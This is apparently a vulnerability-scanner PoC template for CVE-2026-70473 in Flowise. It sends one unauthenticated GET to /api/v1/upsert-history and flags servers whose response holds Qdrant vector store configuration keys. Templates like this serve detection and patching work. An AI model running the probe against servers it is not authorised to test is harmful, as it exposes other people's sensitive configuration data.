[info]
author = "ave"
description = "验证 Flowise GET /api/v1/upsert-history 端点是否存在未授权访问漏洞。该端点返回全服务器范围的 upsert 历史记录（含 Vector Store 敏感配置数据），而非限定于当前用户或工作空间，导致信息泄露。"
id = "POC-AVE-2026-1368"
name = "CVE-2026-70473 Flowise 未授权访问 upsert-history 信息泄露 PoC"
severity = "high"
tags = ["ave-2026-1368"]
vuln_id = [
    "CVE-2026-70473",
    "AVE-2026-1368",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/api/v1/upsert-history"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "qdrantServerUrl",
    "qdrantCollection",
    "qdrantVectorDimension",
]
